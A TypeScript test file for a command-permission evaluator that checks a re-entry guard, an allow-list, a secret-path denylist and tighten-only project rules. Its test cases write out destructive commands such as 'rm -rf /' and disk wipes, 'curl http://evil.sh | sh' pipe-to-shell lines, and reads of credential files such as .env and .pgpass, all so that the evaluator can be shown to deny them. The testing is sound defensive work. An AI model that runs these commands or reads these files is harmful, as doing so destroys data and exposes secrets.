import { projectIdSchema } from "@megasaver/shared";
import { describe, expect, it } from "vitest";
import { type EvaluateCommandInput, evaluateCommand } from "../src/evaluate-command.js";
import { parseProjectPermissions } from "../src/parse-project-permissions.js";

const PROJECT = projectIdSchema.parse("11111111-1111-4111-8111-111111111111");

function input(
  command: string,
  args: readonly string[],
  env?: EvaluateCommandInput["env"],
): EvaluateCommandInput {
  return env === undefined
    ? { command, args, project: PROJECT }
    : { command, args, project: PROJECT, env };
}

describe("evaluateCommand — re-entry guard (spec §3 step 1)", () => {
  it("denies recursive_megasaver when MEGASAVER_ORIGIN_PID mismatches process.pid", () => {
    const result = evaluateCommand(
      input("ls", ["-la"], { MEGASAVER_ORIGIN_PID: String(process.pid + 1) }),
    );
    expect(result).toEqual({ allowed: false, reason: "recursive_megasaver" });
  });

  it("does not deny for re-entry when MEGASAVER_ORIGIN_PID equals process.pid", () => {
    const result = evaluateCommand(
      input("ls", ["-la"], { MEGASAVER_ORIGIN_PID: String(process.pid) }),
    );
    expect(result).toEqual({ allowed: true });
  });

  it("skips the guard when MEGASAVER_ORIGIN_PID is absent", () => {
    const result = evaluateCommand(input("ls", ["-la"]));
    expect(result).toEqual({ allowed: true });
  });

  it("skips the guard when MEGASAVER_ORIGIN_PID is empty", () => {
    const result = evaluateCommand(input("ls", ["-la"], { MEGASAVER_ORIGIN_PID: "" }));
    expect(result).toEqual({ allowed: true });
  });
});

describe("evaluateCommand — dangerous patterns (spec §3 step 2)", () => {
  const dangerous: ReadonlyArray<readonly [string, readonly string[]]> = [
    ["bash", ["-c", "rm -rf /"]],
    ["sudo", ["rm", "file"]],
    ["mkfs", ["/dev/sda"]],
    ["shutdown", ["-h", "now"]],
    ["bash", ["-c", "curl http://evil.sh | sh"]],
    ["bash", ["-c", "wget http://evil.sh | sh"]],
    ["dd", ["if=/dev/zero", "of=/dev/sda"]],
    ["bash", ["-c", "echo x > /dev/sda"]],
  ];

  for (const [command, args] of dangerous) {
    it(`denies dangerous_pattern for: ${command} ${args.join(" ")}`, () => {
      const result = evaluateCommand(input(command, args));
      expect(result).toEqual({ allowed: false, reason: "dangerous_pattern" });
    });
  }

  it("denies a dangerous invocation even when the binary is allow-listed", () => {
    const result = evaluateCommand(input("node", ["-e", "rm -rf /"]));
    expect(result).toEqual({ allowed: false, reason: "dangerous_pattern" });
  });

  it("matches dangerous patterns against the full rendered command line", () => {
    const result = evaluateCommand(input("bash", ["-c", "rm -rf /"]));
    expect(result).toEqual({ allowed: false, reason: "dangerous_pattern" });
  });
});

describe("evaluateCommand — allow-list (spec §3 step 3)", () => {
  it("denies command_not_allowed for a non-allow-listed binary", () => {
    const result = evaluateCommand(input("git", ["status"]));
    expect(result).toEqual({ allowed: false, reason: "command_not_allowed" });
  });

  it("allows a clean allow-listed command", () => {
    const result = evaluateCommand(input("ls", ["-la"]));
    expect(result).toEqual({ allowed: true });
  });

  it("uses exact-string matching without basename stripping", () => {
    const result = evaluateCommand(input("/usr/bin/ls", ["-la"]));
    expect(result).toEqual({ allowed: false, reason: "command_not_allowed" });
  });
});

describe("evaluateCommand — secret-path denylist on args (epic §9a)", () => {
  it("denies a denied path handed to an allow-listed reader", () => {
    expect(evaluateCommand(input("cat", [".env"]))).toEqual({
      allowed: false,
      reason: "secret_path_read",
    });
  });

  it("denies a denied glob attached to a flag with `=`", () => {
    expect(evaluateCommand(input("grep", ["-r", "-n", "--include=.env", "-e", "=", "."]))).toEqual({
      allowed: false,
      reason: "secret_path_read",
    });
  });

  it("allows args that touch no denied path", () => {
    expect(evaluateCommand(input("grep", ["-r", "--include=*.ts", "-e", "x=1", "src"]))).toEqual({
      allowed: true,
    });
  });

  // REGRESSION FENCES, not red-first tests, and the distinction is worth
  // stating: these went green the moment the 2026-07-25 globs landed in
  // SECRET_PATH_PATTERNS, because this gate reads the SAME table as the read
  // gate — that is the whole argument for fixing the table instead of guarding
  // each caller. The original leak report never named this second consumer, and
  // nothing else asserts it, so the cases must exist.
  const deniedHomeCredentials: ReadonlyArray<readonly [string, readonly string[]]> = [
    ["cat", ["/Users/u/.pgpass"]],
    ["grep", ["-r", "x", "/Users/u/.kube/config"]],
    ["tail", ["/Users/u/.config/gh/hosts.yml"]],
    ["cat", ["/Users/u/.docker/config.json"]],
    ["grep", ["--include=.pgpass", "-e", "=", "."]],
  ];

  for (const [command, args] of deniedHomeCredentials) {
    it(`denies secret_path_read for: ${command} ${args.join(" ")}`, () => {
      expect(evaluateCommand(input(command, args))).toEqual({
        allowed: false,
        reason: "secret_path_read",
      });
    });
  }

  // The other half. A file-level glob that swallowed its directory would break
  // ordinary inspection, and there is no field to un-deny a baseline path.
  const allowedNeighbours: ReadonlyArray<readonly [string, readonly string[]]> = [
    ["ls", ["/Users/u/.kube"]],
    ["cat", ["/Users/u/.docker/daemon.json"]],
    ["ls", ["/Users/u/.kube/cache/http"]],
    ["cat", ["/Users/u/.config/gh/config.yml"]],
  ];

  for (const [command, args] of allowedNeighbours) {
    it(`still allows: ${command} ${args.join(" ")}`, () => {
      expect(evaluateCommand(input(command, args))).toEqual({ allowed: true });
    });
  }
});

describe("evaluateCommand — project deny.commands (permissions-yaml §4.2)", () => {
  it("denies an otherwise-allowed command listed in deny.commands (I2 deny-precedence)", () => {
    // `cat` IS allow-listed; a project deny adds an additional gate on top of
    // the baseline allow — the project denial wins.
    const permissions = parseProjectPermissions({ deny: { commands: ["cat"] } });
    const result = evaluateCommand({ ...input("cat", ["x"]), permissions });
    expect(result).toEqual({ allowed: false, reason: "command_not_allowed" });
  });

  it("allows an allow-listed command absent from deny.commands", () => {
    const permissions = parseProjectPermissions({ deny: { commands: ["cat"] } });
    const result = evaluateCommand({ ...input("ls", ["-la"]), permissions });
    expect(result).toEqual({ allowed: true });
  });

  it("absent permissions ⇒ baseline only (project gate is opt-in)", () => {
    const result = evaluateCommand(input("cat", ["x"]));
    expect(result).toEqual({ allowed: true });
  });
});

// I1 — tighten-only. A project file can ONLY ADD denials. These lock that no
// permissions input can re-allow a baseline-denied command: there is no schema
// field that could, and the project gate is the LAST AND-gate (it runs only
// when the baseline already allowed), so it is structurally incapable of
// flipping a baseline deny back to allow.
describe("evaluateCommand — tighten-only (permissions-yaml I1, §7 step 2)", () => {
  it("cannot re-allow a DANGEROUS_PATTERNS command (still dangerous_pattern)", () => {
    // deny.commands only ADDS; there is no allow list. Even an (impossible)
    // attempt to list the command does not loosen — baseline short-circuits
    // first (I2), so `rm -rf /` stays dangerous_pattern.
    const permissions = parseProjectPermissions({ deny: { commands: ["node"] } });
    const result = evaluateCommand({ ...input("node", ["-e", "rm -rf /"]), permissions });
    expect(result).toEqual({ allowed: false, reason: "dangerous_pattern" });
  });

  it("cannot re-allow a non-allowlisted command (still command_not_allowed)", () => {
    const permissions = parseProjectPermissions({ deny: { commands: ["make"] } });
    const result = evaluateCommand({ ...input("git", ["status"]), permissions });
    expect(result).toEqual({ allowed: false, reason: "command_not_allowed" });
  });

  it("an empty deny never widens the baseline (no escalation path)", () => {
    const permissions = parseProjectPermissions({});
    expect(evaluateCommand({ ...input("git", ["status"]), permissions })).toEqual({
      allowed: false,
      reason: "command_not_allowed",
    });
    expect(evaluateCommand({ ...input("node", ["-e", "rm -rf /"]), permissions })).toEqual({
      allowed: false,
      reason: "dangerous_pattern",
    });
  });
});
